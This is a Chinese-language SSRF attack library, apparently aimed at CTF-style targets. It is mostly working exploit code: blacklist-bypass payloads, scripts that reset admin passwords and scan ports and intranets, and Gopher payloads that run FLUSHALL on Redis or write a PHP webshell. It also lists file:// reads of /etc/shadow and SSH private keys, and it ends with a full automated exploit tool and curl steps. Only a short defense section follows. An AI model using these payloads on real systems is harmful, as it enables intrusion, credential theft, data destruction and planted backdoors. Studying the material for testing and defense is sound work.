# SSRF-本地服务访问-攻击库

## 概述

**攻击类型**：Server-Side Request Forgery - 本地服务访问  
**影响组件**：urllib/requests/curl/file_get_contents  
**风险等级**：Critical  
**攻击目标**：利用服务器发起请求的功能访问内网服务、本地管理接口和受限资源

**核心原理**：
当Web应用允许用户提供URL并由服务器获取该URL的内容时，攻击者可以构造特殊URL访问本地服务（127.0.0.1、localhost）或内网资源，绕过网络访问控制，执行未授权操作。

**典型场景**：
- 通过URL上传图片/头像
- 获取远程内容功能
- Webhook回调
- 文件导入功能
- URL预览/缩略图生成

---

## 核心攻击技术

### 技术1：基本本地服务访问

**原理**：
通过SSRF漏洞访问127.0.0.1或localhost上的服务，绕过"仅本地访问"的限制。

**漏洞代码示例**：
```python
import urllib.request

@app.route('/profile', methods=['POST'])
def profile():
    profile_picture_url = request.form.get('profile_picture_url')
    
    if profile_picture_url:
        # ⚠️ 直接获取用户提供的URL，无验证
        filename = secure_filename(profile_picture_url.split('/')[-1])
        urllib.request.urlretrieve(profile_picture_url, 
                                  os.path.join(UPLOAD_FOLDER, filename))
    
    return render_template('profile.html')
```

**攻击Payload**：
```bash
# 访问本地服务
http://127.0.0.1/admin
http://localhost:8080/管理后台
http://0.0.0.0:9000/api

# 访问本地文件（file协议）
file:///etc/passwd
file:///c:/windows/win.ini

# 访问本地数据库
http://127.0.0.1:3306/
http://localhost:27017/

# 访问本地Redis
http://127.0.0.1:6379/
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
```

**自动化利用代码**：
```python
def exploit_basic_ssrf(target_url, ssrf_param):
    """基本SSRF本地服务访问"""
    
    session = requests.Session()
    
    # 本地服务探测列表
    local_services = [
        # HTTP服务
        'http://127.0.0.1:80/',
        'http://127.0.0.1:8080/',
        'http://localhost:80/',
        'http://0.0.0.0:80/',
        
        # 常见管理接口
        'http://127.0.0.1/admin',
        'http://127.0.0.1/manager',
        'http://127.0.0.1:8080/admin',
        
        # 数据库服务
        'http://127.0.0.1:3306/',
        'http://127.0.0.1:5432/',
        'http://127.0.0.1:27017/',
        'http://127.0.0.1:6379/',
        
        # 其他服务
        'http://127.0.0.1:9200/',  # Elasticsearch
        'http://127.0.0.1:8500/',  # Consul
        'http://127.0.0.1:2375/',  # Docker API
    ]
    
    results = []
    
    for service_url in local_services:
        try:
            print(f"[*] 测试: {service_url}")
            
            # 构造SSRF payload
            data = {ssrf_param: service_url}
            r = session.post(target_url, data=data, timeout=10)
            
            # 检查响应
            if r.status_code == 200:
                # 检查响应内容特征
                if len(r.text) > 100:
                    print(f"[+] 可访问: {service_url}")
                    print(f"    响应长度: {len(r.text)}")
                    results.append({
                        'url': service_url,
                        'status': r.status_code,
                        'length': len(r.text),
                        'content': r.text[:200]
                    })
                    
        except Exception as e:
            continue
    
    return results
```

---

### 技术2：绕过本地地址黑名单

**原理**：
应用程序通常会过滤`127.0.0.1`、`localhost`等关键词，可以使用多种编码和变体绕过。

**绕过技术1 - IP地址变体**：
```bash
# 十进制IP
http://2130706433/          # 127.0.0.1的十进制形式

# 八进制IP
http://0177.0.0.1/          # 127.0.0.1
http://0x7f.0x0.0x0.0x1/    # 十六进制

# 混合编码
http://0x7f.0.0.1/
http://127.1/               # 省略中间的0
http://127.0.1/

# IPv6形式
http://[::1]/               # IPv6本地回环
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/  # IPv4映射
```

**绕过技术2 - DNS重绑定**：
```bash
# 使用指向127.0.0.1的域名
http://localtest.me/        # 公共DNS，解析到127.0.0.1
http://127.0.0.1.nip.io/
http://0.0.0.0.nip.io/

# 短地址服务
http://bit.ly/xxxxx         # 短链接重定向到127.0.0.1
```

**绕过技术3 - URL解析差异**：
```bash
# 使用@符号
http://evil.com@127.0.0.1/
http://user@127.0.0.1:80/

# 使用反斜杠
http://127.0.0.1\@evil.com/

# 使用#号
http://127.0.0.1#@evil.com/
```

**绕过技术4 - 协议绕过**：
```bash
# 使用不同协议
file:///etc/passwd
dict://127.0.0.1:11211/stat
gopher://127.0.0.1:6379/_
ftp://127.0.0.1/

# HTTPS绕过HTTP过滤
https://127.0.0.1/
```

**完整绕过利用代码**：
```python
def bypass_localhost_blacklist(target_url, ssrf_param):
    """绕过本地地址黑名单"""
    
    bypass_payloads = [
        # IP变体
        'http://2130706433/',           # 十进制
        'http://0177.0.0.1/',           # 八进制
        'http://0x7f.0x0.0x1/',         # 十六进制
        'http://127.1/',                # 简写
        'http://[::1]/',                # IPv6
        'http://[::ffff:127.0.0.1]/',   # IPv4映射
        
        # DNS技巧
        'http://localtest.me/',
        'http://127.0.0.1.nip.io/',
        'http://0.0.0.0.nip.io/',
        
        # URL解析
        'http://evil.com@127.0.0.1/',
        'http://127.0.0.1#@evil.com/',
        
        # 协议变体
        'https://127.0.0.1/',
        'file:///etc/passwd',
    ]
    
    session = requests.Session()
    
    for payload in bypass_payloads:
        try:
            print(f"[*] 尝试绕过: {payload}")
            
            data = {ssrf_param: payload}
            r = session.post(target_url, data=data, timeout=10)
            
            # 检查是否成功绕过
            if r.status_code == 200 and len(r.text) > 50:
                print(f"[+] 绕过成功: {payload}")
                print(f"    响应: {r.text[:200]}")
                return payload
                
        except Exception as e:
            continue
    
    return None
```

---

### 技术3：访问受限管理接口

**原理**：
许多应用有仅限本地访问的管理接口（如密码重置、管理后台），可通过SSRF访问这些接口。

**典型受限接口**：
```python
# 仅限本地访问的密码重置
@app.route('/reset_password')
def reset_password():
    if request.remote_addr != '127.0.0.1':
        return "Unauthorized", 403
    
    username = request.args.get('username')
    new_password = request.args.get('newpassword')
    
    users[username]['password'] = new_password
    return "Password reset successfully"
```

**攻击流程**：
```
1. 发现SSRF漏洞 → 2. 探测本地管理接口 → 3. 通过SSRF访问接口 → 4. 执行管理操作
```

**攻击Payload**：
```bash
# 重置管理员密码
http://127.0.0.1/reset_password?username=admin&newpassword=hacked

# 访问管理后台
http://127.0.0.1/admin/users
http://127.0.0.1:8080/manager/html

# 执行管理命令
http://127.0.0.1/api/exec?cmd=whoami
http://127.0.0.1:9000/admin/restart
```

**完整利用代码**：
```python
def exploit_admin_interface_ssrf(target_url, ssrf_param):
    """利用SSRF访问受限管理接口"""
    
    session = requests.Session()
    
    # 常见管理接口路径
    admin_paths = [
        '/admin',
        '/admin/users',
        '/admin/config',
        '/manager/html',
        '/reset_password',
        '/api/admin',
        '/admin/dashboard',
        '/console',
    ]
    
    # 1. 注册普通用户账号
    print("[*] 步骤1: 注册用户账号...")
    register_data = {'username': 'attacker', 'password': 'pass123'}
    session.post(f"{target_url.split('/profile')[0]}/register", 
                data=register_data)
    
    # 2. 登录
    print("[*] 步骤2: 登录...")
    login_data = {'username': 'attacker', 'password': 'pass123'}
    session.post(f"{target_url.split('/profile')[0]}/login", 
                data=login_data)
    
    # 3. 探测管理接口
    print("[*] 步骤3: 探测管理接口...")
    
    for path in admin_paths:
        ssrf_url = f"http://127.0.0.1{path}"
        
        try:
            data = {ssrf_param: ssrf_url}
            r = session.post(target_url, data=data, timeout=10)
            
            if r.status_code == 200 and len(r.text) > 100:
                print(f"[+] 发现管理接口: {path}")
                print(f"    响应长度: {len(r.text)}")
                
        except Exception as e:
            continue
    
    # 4. 利用密码重置接口
    print("\n[*] 步骤4: 尝试重置admin密码...")
    
    reset_payloads = [
        'http://127.0.0.1/reset_password?username=admin&newpassword=hacked123',
        'http://127.0.0.1:5000/reset_password?username=admin&newpassword=hacked123',
        'http://localhost/reset_password?username=admin&newpassword=hacked123',
    ]
    
    for payload in reset_payloads:
        try:
            data = {ssrf_param: payload}
            r = session.post(target_url, data=data, timeout=10)
            
            if 'success' in r.text.lower() or r.status_code == 200:
                print(f"[+] 密码重置成功!")
                print(f"    Payload: {payload}")
                
                # 5. 尝试用新密码登录admin
                print("\n[*] 步骤5: 使用新密码登录admin...")
                
                admin_session = requests.Session()
                admin_login = {'username': 'admin', 'password': 'hacked123'}
                r = admin_session.post(
                    f"{target_url.split('/profile')[0]}/login", 
                    data=admin_login
                )
                
                if 'welcome' in r.text.lower() or r.status_code == 200:
                    print("[+] 成功登录admin账户!")
                    
                    # 6. 访问admin的profile获取flag
                    r = admin_session.get(
                        f"{target_url.split('/profile')[0]}/profile"
                    )
                    
                    if 'flag{' in r.text.lower():
                        print("[+] 找到FLAG!")
                        import re
                        flag = re.search(r'flag\{[^}]+\}', r.text, re.I)
                        if flag:
                            print(f"[+] FLAG: {flag.group()}")
                            return flag.group()
                
                return True
                
        except Exception as e:
            continue
    
    return None
```

---

### 技术4：端口扫描和服务探测

**原理**：
利用SSRF功能扫描内网端口，探测运行的服务。

**端口扫描Payload**：
```python
# 扫描常见端口
ports = [21, 22, 23, 25, 80, 443, 3306, 5432, 6379, 8080, 9000]

for port in ports:
    payload = f"http://127.0.0.1:{port}/"
```

**自动化端口扫描**：
```python
def ssrf_port_scan(target_url, ssrf_param, target_host='127.0.0.1'):
    """使用SSRF进行端口扫描"""
    
    session = requests.Session()
    
    # 常见端口列表
    common_ports = [
        21,    # FTP
        22,    # SSH
        23,    # Telnet
        25,    # SMTP
        80,    # HTTP
        443,   # HTTPS
        3306,  # MySQL
        5432,  # PostgreSQL
        6379,  # Redis
        8080,  # HTTP-Alt
        8443,  # HTTPS-Alt
        9000,  # PHP-FPM
        9200,  # Elasticsearch
        27017, # MongoDB
    ]
    
    open_ports = []
    
    print(f"[*] 扫描目标: {target_host}")
    print(f"[*] 扫描端口: {len(common_ports)}个")
    
    for port in common_ports:
        try:
            ssrf_url = f"http://{target_host}:{port}/"
            
            data = {ssrf_param: ssrf_url}
            
            # 使用较短的超时检测端口
            r = session.post(target_url, data=data, timeout=5)
            
            # 根据响应判断端口状态
            if r.status_code in [200, 301, 302, 401, 403]:
                print(f"[+] 端口 {port} 开放")
                open_ports.append(port)
                
                # 识别服务
                service = identify_service(r.text, port)
                if service:
                    print(f"    服务: {service}")
                    
        except requests.Timeout:
            # 超时可能说明端口开放但服务无响应
            print(f"[?] 端口 {port} 可能开放（超时）")
        except Exception as e:
            # 连接被拒绝说明端口关闭
            continue
    
    print(f"\n[+] 扫描完成，开放端口: {open_ports}")
    return open_ports

def identify_service(response_text, port):
    """根据响应识别服务类型"""
    
    signatures = {
        'MySQL': ['mysql', 'mariadb'],
        'PostgreSQL': ['postgresql', 'postgres'],
        'Redis': ['redis', '-ERR'],
        'MongoDB': ['mongodb', 'mongo'],
        'Elasticsearch': ['elasticsearch', 'lucene'],
        'Apache': ['apache', 'httpd'],
        'Nginx': ['nginx'],
        'Tomcat': ['tomcat', 'apache-coyote'],
    }
    
    response_lower = response_text.lower()
    
    for service, keywords in signatures.items():
        for keyword in keywords:
            if keyword in response_lower:
                return service
    
    return None
```

---

### 技术5：协议利用 - Gopher协议攻击

**原理**：
Gopher协议可以发送任意TCP数据，通过SSRF+Gopher可以攻击内网服务（Redis、MySQL等）。

**Gopher协议基础**：
```bash
# Gopher URL格式
gopher://host:port/_<TCP数据>

# 特殊字符需要URL编码
# \r\n → %0d%0a
```

**攻击Redis示例**：
```python
import urllib.parse

def generate_redis_gopher_payload(commands):
    """生成Redis Gopher payload"""
    
    # Redis协议格式
    redis_payload = ""
    
    for cmd in commands:
        parts = cmd.split()
        redis_payload += f"*{len(parts)}\r\n"
        
        for part in parts:
            redis_payload += f"${len(part)}\r\n{part}\r\n"
    
    # URL编码
    encoded = urllib.parse.quote(redis_payload)
    
    # Gopher URL
    gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"
    
    return gopher_url

# 使用示例
commands = [
    "FLUSHALL",                          # 清空数据库
    "SET pwned 'hacked'",               # 设置键值
    "CONFIG SET dir /var/www/html",     # 设置目录
    "CONFIG SET dbfilename shell.php",  # 设置文件名
    "SET x '<?php system($_GET[\"c\"]);?>'",  # 写入webshell
    "SAVE"                              # 保存
]

payload = generate_redis_gopher_payload(commands)
print(payload)
```

**攻击MySQL示例**：
```python
def generate_mysql_gopher_payload():
    """生成MySQL Gopher payload（简化版）"""
    
    # MySQL握手包（需要手工构造二进制数据）
    # 这里仅作示例
    mysql_payload = b"\x00\x00\x00..." # 实际需要完整的MySQL协议包
    
    encoded = urllib.parse.quote(mysql_payload)
    gopher_url = f"gopher://127.0.0.1:3306/_{encoded}"
    
    return gopher_url
```

**Gopher利用代码**：
```python
def exploit_gopher_ssrf(target_url, ssrf_param):
    """利用Gopher协议攻击内网服务"""
    
    session = requests.Session()
    
    # 1. 攻击Redis
    print("[*] 尝试攻击Redis...")
    
    redis_commands = [
        "INFO",  # 获取Redis信息
        "CONFIG GET dir",  # 获取工作目录
    ]
    
    gopher_payload = generate_redis_gopher_payload(redis_commands)
    
    try:
        data = {ssrf_param: gopher_payload}
        r = session.post(target_url, data=data, timeout=10)
        
        if 'redis_version' in r.text.lower():
            print("[+] Redis攻击成功!")
            print(f"    响应: {r.text[:200]}")
            
    except Exception as e:
        print(f"[-] Redis攻击失败: {e}")
    
    # 2. 攻击其他服务...
```

---

### 技术6：文件协议读取本地文件

**原理**：
如果SSRF支持file://协议，可以直接读取服务器本地文件。

**Payload示例**：
```bash
# Linux系统文件
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///root/.ssh/id_rsa
file:///var/log/apache2/access.log

# Windows系统文件
file:///c:/windows/win.ini
file:///c:/windows/system32/drivers/etc/hosts

# 应用文件
file:///var/www/html/config.php
file:///home/user/app/settings.py
file:///tmp/flag.txt
```

**利用代码**：
```python
def exploit_file_protocol_ssrf(target_url, ssrf_param):
    """利用file://协议读取本地文件"""
    
    session = requests.Session()
    
    # 目标文件列表
    target_files = [
        'file:///etc/passwd',
        'file:///etc/hosts',
        'file:///flag.txt',
        'file:///tmp/flag',
        'file:///var/www/flag',
        'file:///home/flag.txt',
    ]
    
    for file_url in target_files:
        try:
            print(f"[*] 尝试读取: {file_url}")
            
            data = {ssrf_param: file_url}
            r = session.post(target_url, data=data, timeout=10)
            
            if r.status_code == 200 and len(r.text) > 0:
                print(f"[+] 成功读取!")
                print(f"    内容:\n{r.text[:500]}")
                
                # 检查是否包含flag
                if 'flag{' in r.text.lower():
                    print(f"\n[+] 找到FLAG!")
                    return r.text
                    
        except Exception as e:
            continue
    
    return None
```

---

### 技术7：内网服务探测

**原理**：
利用SSRF探测内网（192.168.x.x、10.x.x.x）中的其他服务器和服务。

**内网探测Payload**：
```python
# 常见内网IP段
internal_ips = [
    '192.168.1.{}',    # 家用网络
    '192.168.0.{}',
    '10.0.0.{}',       # 企业网络
    '172.16.0.{}',
]

# 生成探测URL
for ip_template in internal_ips:
    for i in range(1, 255):
        ip = ip_template.format(i)
        url = f"http://{ip}/"
```

**自动化内网扫描**：
```python
def ssrf_internal_network_scan(target_url, ssrf_param):
    """扫描内网主机"""
    
    session = requests.Session()
    
    # 内网IP段
    ip_ranges = [
        '192.168.1.{}',
        '192.168.0.{}',
        '10.0.0.{}',
        '172.16.0.{}',
    ]
    
    active_hosts = []
    
    print("[*] 开始内网扫描...")
    
    for ip_template in ip_ranges:
        print(f"[*] 扫描网段: {ip_template}")
        
        # 仅扫描部分IP以节省时间
        for i in [1, 10, 50, 100, 200, 254]:
            ip = ip_template.format(i)
            ssrf_url = f"http://{ip}/"
            
            try:
                data = {ssrf_param: ssrf_url}
                r = session.post(target_url, data=data, timeout=3)
                
                if r.status_code == 200 and len(r.text) > 50:
                    print(f"[+] 发现活跃主机: {ip}")
                    active_hosts.append(ip)
                    
            except requests.Timeout:
                continue
            except Exception:
                continue
    
    print(f"\n[+] 扫描完成，发现 {len(active_hosts)} 个活跃主机")
    return active_hosts
```

---

## 完整自动化利用工具

```python
#!/usr/bin/env python3
"""
SSRF本地服务访问完整利用工具
"""
import requests
import sys
import re
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

class SSRFLocalExploit:
    def __init__(self, target_url, ssrf_param='profile_picture_url'):
        self.target_url = target_url
        self.ssrf_param = ssrf_param
        self.session = requests.Session()
        self.findings = []
    
    def register_and_login(self, username='testuser', password='testpass'):
        """注册并登录"""
        base_url = self.target_url.rsplit('/', 1)[0]
        
        try:
            # 注册
            print("[*] 注册用户...")
            register_data = {'username': username, 'password': password}
            self.session.post(f"{base_url}/register", data=register_data, timeout=10)
            
            # 登录
            print("[*] 登录...")
            login_data = {'username': username, 'password': password}
            self.session.post(f"{base_url}/login", data=login_data, timeout=10)
            
            print("[+] 登录成功\n")
            return True
            
        except Exception as e:
            print(f"[-] 登录失败: {e}")
            return False
    
    def test_ssrf_basic(self):
        """测试基本SSRF"""
        print("[*] 测试基本SSRF...")
        
        test_urls = [
            'http://127.0.0.1/',
            'http://localhost/',
            'file:///etc/passwd',
        ]
        
        for url in test_urls:
            try:
                data = {self.ssrf_param: url}
                r = self.session.post(self.target_url, data=data, timeout=10)
                
                if r.status_code == 200:
                    print(f"[+] SSRF成功: {url}")
                    return True
                    
            except Exception as e:
                continue
        
        print("[-] 基本SSRF测试失败")
        return False
    
    def scan_local_ports(self):
        """扫描本地端口"""
        print("\n[*] 扫描本地端口...")
        
        common_ports = [80, 443, 3306, 5432, 6379, 8080, 9000]
        open_ports = []
        
        for port in common_ports:
            try:
                ssrf_url = f"http://127.0.0.1:{port}/"
                data = {self.ssrf_param: ssrf_url}
                
                r = self.session.post(self.target_url, data=data, timeout=5)
                
                if r.status_code in [200, 301, 302, 401]:
                    print(f"[+] 端口 {port} 开放")
                    open_ports.append(port)
                    
            except Exception:
                continue
        
        return open_ports
    
    def exploit_admin_reset(self):
        """利用管理员密码重置"""
        print("\n[*] 尝试重置admin密码...")
        
        reset_urls = [
            'http://127.0.0.1/reset_password?username=admin&newpassword=hacked123',
            'http://localhost/reset_password?username=admin&newpassword=hacked123',
            'http://127.0.0.1:5000/reset_password?username=admin&newpassword=hacked123',
        ]
        
        for reset_url in reset_urls:
            try:
                data = {self.ssrf_param: reset_url}
                r = self.session.post(self.target_url, data=data, timeout=10)
                
                if 'success' in r.text.lower() or r.status_code == 200:
                    print(f"[+] 密码重置成功!")
                    return True
                    
            except Exception:
                continue
        
        return False
    
    def login_as_admin(self):
        """使用重置后的密码登录admin"""
        print("\n[*] 尝试登录admin...")
        
        base_url = self.target_url.rsplit('/', 1)[0]
        
        admin_session = requests.Session()
        
        try:
            login_data = {'username': 'admin', 'password': 'hacked123'}
            r = admin_session.post(f"{base_url}/login", data=login_data, timeout=10)
            
            # 访问profile查找flag
            r = admin_session.get(f"{base_url}/profile", timeout=10)
            
            if 'flag{' in r.text.lower():
                print("[+] 成功登录admin并找到FLAG!")
                
                flag_match = re.search(r'flag\{[^}]+\}', r.text, re.I)
                if flag_match:
                    flag = flag_match.group()
                    print(f"[+] FLAG: {flag}")
                    return flag
                    
        except Exception as e:
            print(f"[-] admin登录失败: {e}")
        
        return None
    
    def read_local_files(self):
        """读取本地文件"""
        print("\n[*] 尝试读取本地文件...")
        
        target_files = [
            'file:///etc/passwd',
            'file:///flag.txt',
            'file:///tmp/flag',
            'file:///FLAG',
        ]
        
        for file_url in target_files:
            try:
                data = {self.ssrf_param: file_url}
                r = self.session.post(self.target_url, data=data, timeout=10)
                
                if r.status_code == 200 and len(r.text) > 0:
                    print(f"[+] 成功读取: {file_url}")
                    print(f"    内容预览: {r.text[:200]}")
                    
                    if 'flag{' in r.text.lower():
                        return r.text
                        
            except Exception:
                continue
        
        return None
    
    def full_exploit(self):
        """完整利用流程"""
        print("="*60)
        print("SSRF本地服务访问完整利用工具")
        print("="*60 + "\n")
        
        print(f"[*] 目标: {self.target_url}")
        print(f"[*] SSRF参数: {self.ssrf_param}\n")
        
        # 1. 注册登录
        if not self.register_and_login():
            return None
        
        # 2. 测试SSRF
        if not self.test_ssrf_basic():
            return None
        
        # 3. 扫描端口
        self.scan_local_ports()
        
        # 4. 利用admin重置
        if self.exploit_admin_reset():
            # 5. 登录admin获取flag
            flag = self.login_as_admin()
            if flag:
                return flag
        
        # 6. 尝试读取文件
        result = self.read_local_files()
        if result:
            return result
        
        print("\n[-] 利用未成功")
        return None

# 命令行使用
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL> [SSRF参数名]")
        print(f"例如: {sys.argv[0]} http://target:5000/profile")
        print(f"      {sys.argv[0]} http://target:5000/profile profile_picture_url")
        sys.exit(1)
    
    target = sys.argv[1]
    param = sys.argv[2] if len(sys.argv) > 2 else 'profile_picture_url'
    
    exploit = SSRFLocalExploit(target, param)
    result = exploit.full_exploit()
    
    if result:
        print(f"\n[+] 攻击成功!")
        print(f"[+] 结果: {result[:200]}")
    else:
        print("\n[-] 攻击失败")
```

---

## 实战场景

### 场景1：头像上传功能SSRF

**应用背景**：
用户资料管理系统，允许通过URL上传头像，存在SSRF漏洞。

**漏洞代码**：
```python
@app.route('/profile', methods=['POST'])
def profile():
    profile_picture_url = request.form.get('profile_picture_url')
    
    if profile_picture_url:
        filename = secure_filename(profile_picture_url.split('/')[-1])
        urllib.request.urlretrieve(profile_picture_url, 
                                  os.path.join(UPLOAD_FOLDER, filename))
    
    return render_template('profile.html')
```

**利用步骤**：
```python
import requests

session = requests.Session()

# 1. 注册登录
session.post('http://target/register', data={'username': 'test', 'password': 'test'})
session.post('http://target/login', data={'username': 'test', 'password': 'test'})

# 2. 利用SSRF重置admin密码
session.post('http://target/profile', data={
    'profile_picture_url': 'http://127.0.0.1/reset_password?username=admin&newpassword=hack'
})

# 3. 登录admin
admin_session = requests.Session()
admin_session.post('http://target/login', data={'username': 'admin', 'password': 'hack'})

# 4. 获取flag
r = admin_session.get('http://target/profile')
print(r.text)  # 包含flag
```

---

### 场景2：SSRF端口扫描

**利用脚本**：
```python
import requests

session = requests.Session()
session.post('http://target/login', data={'user': 'test', 'pass': 'test'})

# 扫描本地端口
for port in [80, 443, 3306, 6379, 8080, 9000]:
    r = session.post('http://target/profile', data={
        'profile_picture_url': f'http://127.0.0.1:{port}/'
    })
    
    if r.status_code == 200:
        print(f"[+] 端口 {port} 开放")
```

---

## 手动测试命令

```bash
# 1. 注册用户
curl -c cookies.txt -X POST http://target/register \
  -d "username=test&password=test123"

# 2. 登录
curl -b cookies.txt -c cookies.txt -X POST http://target/login \
  -d "username=test&password=test123"

# 3. SSRF访问本地服务
curl -b cookies.txt -X POST http://target/profile \
  -d "profile_picture_url=http://127.0.0.1/admin"

# 4. SSRF重置admin密码
curl -b cookies.txt -X POST http://target/profile \
  -d "profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=hacked"

# 5. 登录admin
curl -c admin.txt -X POST http://target/login \
  -d "username=admin&password=hacked"

# 6. 获取flag
curl -b admin.txt http://target/profile
```

---

## Payload速查表

| 目标 | Payload示例 |
|------|------------|
| 本地HTTP | `http://127.0.0.1/` |
| 本地HTTPS | `https://localhost/` |
| 管理接口 | `http://127.0.0.1/admin` |
| 密码重置 | `http://127.0.0.1/reset_password?user=admin&pass=hack` |
| 读取文件 | `file:///etc/passwd` |
| Redis | `gopher://127.0.0.1:6379/_...` |
| 端口探测 | `http://127.0.0.1:3306/` |
| IPv6本地 | `http://[::1]/` |
| 十进制IP | `http://2130706433/` |

---

## 防御措施

### 1. URL白名单验证

```python
from urllib.parse import urlparse

def validate_url(url):
    """验证URL是否在白名单内"""
    
    allowed_domains = ['cdn.example.com', 'images.example.com']
    
    parsed = urlparse(url)
    
    # 检查协议
    if parsed.scheme not in ['http', 'https']:
        raise ValueError("仅允许HTTP/HTTPS协议")
    
    # 检查域名
    if parsed.hostname not in allowed_domains:
        raise ValueError("域名不在白名单内")
    
    return True
```

### 2. 禁止访问内网IP

```python
import ipaddress

def is_private_ip(hostname):
    """检查是否为私有IP"""
    try:
        ip = ipaddress.ip_address(hostname)
        return ip.is_private or ip.is_loopback
    except:
        return False

def validate_url_safe(url):
    parsed = urlparse(url)
    
    if is_private_ip(parsed.hostname):
        raise ValueError("禁止访问内网IP")
```

### 3. 禁用危险协议

```python
def validate_protocol(url):
    """仅允许安全协议"""
    
    allowed_protocols = ['http', 'https']
    
    parsed = urlparse(url)
    
    if parsed.scheme not in allowed_protocols:
        raise ValueError(f"不允许的协议: {parsed.scheme}")
```

---

## 总结

**SSRF本地服务访问攻击要点**：
1. ✅ 利用SSRF访问127.0.0.1/localhost绕过本地限制
2. ✅ 通过多种编码和变体绕过黑名单过滤
3. ✅ 访问受限管理接口（密码重置、后台管理）
4. ✅ 使用Gopher协议攻击Redis等内网服务
5. ✅ file://协议读取本地敏感文件
6. ✅ 防御关键：URL白名单+禁止内网IP+协议限制

SSRF是服务端最危险的漏洞之一，可以突破网络边界访问内网资源。
